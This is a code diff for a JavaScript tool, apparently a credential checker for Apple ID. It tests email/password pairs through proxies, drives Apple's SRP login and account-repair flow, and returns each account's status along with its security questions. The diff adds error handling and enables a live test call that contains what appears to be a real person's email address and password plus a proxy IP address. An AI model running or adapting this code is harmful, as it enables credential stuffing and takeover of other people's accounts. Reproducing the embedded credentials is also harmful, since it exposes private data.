@@ -68,6 +68,7 @@ const initSRP = (proxy, bodyData) => {
       })
       .catch((error) => {
         console.log("initSRP failed!")
+        resolve(false)
       });
   })
 }
@@ -113,6 +114,8 @@ const loginIdApple = (proxy, proof) => {
           resolve("sai pass")
         } else if (error?.response?.status == 412) {
           resolve({ cookies: error?.response?.headers['set-cookie'], headers: error?.response?.headers })
+        } else {
+          resolve(false)
         }
       });
   })
@@ -198,14 +201,12 @@ const option = (proxy, sessionId, sessionToken, widgetId) => {
         }
       })
       .catch((error) => {
-        if (!error?.response?.status) {
-          resolve(false)
+        if (error?.response?.data?.security?.birthday) {
+          resolve({ type: "birthday", headers: response.headers })
+        } else if (error?.response?.data?.security?.questions) {
+          resolve({ type: "questions", headers: response.headers })
         } else {
-          if (error?.response?.data?.security?.birthday) {
-            resolve({ type: "birthday", headers: response.headers })
-          } else if (error?.response?.data?.security?.questions) {
-            resolve({ type: "questions", headers: response.headers })
-          }
+          resolve(false)
         }
       });
   })
@@ -356,54 +357,72 @@ const CHBMAppleID = (email, pass, proxyString) => {
         let initData = await authenticator.getInit();
         // request SRP init data from server
         let initResp = await initSRP(proxy, initData);
-        // get proof of password
-        let proof = await authenticator.getComplete(pass, initResp);
-        // send proof to server
-        let completeResp = await loginIdApple(proxy, proof)
-        if (typeof completeResp === "string") {
-          return resolve({
-            mail: email,
-            pass: pass,
-            proxy: proxyString,
-            status: 'checked',
-            note: completeResp
-          })
-        } else if (completeResp) {
-          let { headers } = completeResp;
-          let aidsp = null;
-          const repairCookies = await repair(proxy, widgetKey);
-          if (Array.isArray(repairCookies) && headers) {
-            for (const c of repairCookies) {
-              if (c.includes("aidsp=")) {
-                let carr = c.split(";")
-                aidsp = carr[0]?.split("=")?.[1]
-              }
-            }
-            let optionHeader = await option(proxy, aidsp, headers['x-apple-repair-session-token'], widgetKey);
-            if (optionHeader) {
-              let type = optionHeader.type;
-              optionHeader = optionHeader.headers;
-              if (type == 'birthday') {
-                birthday = await repairBirthDay(proxy, aidsp, optionHeader['x-apple-session-token'], optionHeader['scnt'], widgetKey);
-                index--;
-                continue;
-              } else if (type == 'questions') {
-                const questions = await repairQuestions(proxy, aidsp, optionHeader['x-apple-session-token'], optionHeader['scnt'], widgetKey);
-                if (questions) {
-                  return resolve({
-                    mail: email,
-                    pass: pass,
-                    proxy: proxyString,
-                    status: 'checked',
-                    note: 'successfully',
-                    questions: questions,
-                    birthday
-                  })
+        if (initResp) {
+          // get proof of password
+          let proof = await authenticator.getComplete(pass, initResp);
+          // send proof to server
+          let completeResp = await loginIdApple(proxy, proof);
+          if (typeof completeResp === "string") {
+            return resolve({
+              mail: email,
+              pass: pass,
+              proxy: proxyString,
+              status: 'checked',
+              note: completeResp
+            })
+          } else if (completeResp) {
+            let { headers } = completeResp;
+            let aidsp = null;
+            const repairCookies = await repair(proxy, widgetKey);
+            if (Array.isArray(repairCookies) && headers) {
+              for (const c of repairCookies) {
+                if (c.includes("aidsp=")) {
+                  let carr = c.split(";")
+                  aidsp = carr[0]?.split("=")?.[1]
                 }
               }
+              let optionHeader = await option(proxy, aidsp, headers['x-apple-repair-session-token'], widgetKey);
+              if (optionHeader) {
+                let type = optionHeader.type;
+                optionHeader = optionHeader.headers;
+                if (type == 'birthday') {
+                  birthday = await repairBirthDay(proxy, aidsp, optionHeader['x-apple-session-token'], optionHeader['scnt'], widgetKey);
+                  index--;
+                  continue;
+                } else if (type == 'questions') {
+                  const questions = await repairQuestions(proxy, aidsp, optionHeader['x-apple-session-token'], optionHeader['scnt'], widgetKey);
+                  if (questions) {
+                    return resolve({
+                      mail: email,
+                      pass: pass,
+                      proxy: proxyString,
+                      status: 'checked',
+                      note: 'successfully',
+                      questions: questions,
+                      birthday
+                    })
+                  }
+                }
+              } else {
+                return resolve({
+                  mail: email,
+                  pass: pass,
+                  proxy: proxyString,
+                  status: 'checked',
+                  note: 'CHBM'
+                })
+              }
+            } else {
+              break;
             }
           } else {
-            break;
+            return resolve({
+              mail: email,
+              pass: pass,
+              proxy: proxyString,
+              status: 'checked',
+              note: 'locked'
+            })
           }
         }
       }
@@ -425,10 +444,10 @@ const CHBMAppleID = (email, pass, proxyString) => {
   })
 }
 
-// (async () => {
-//   let a = await CHBMAppleID("smiles_2935@hotmail.com", "EzayiBOIaA4@", "38.174.39.200:3128");
-//   console.log(a);
-// })()
+(async () => {
+  let a = await CHBMAppleID("gentry_phillps@hotmail.com", "7UFcfEdD865@", "38.174.39.200:3128");
+  console.log(a);
+})()
 
 module.exports = {
   CHBMAppleID
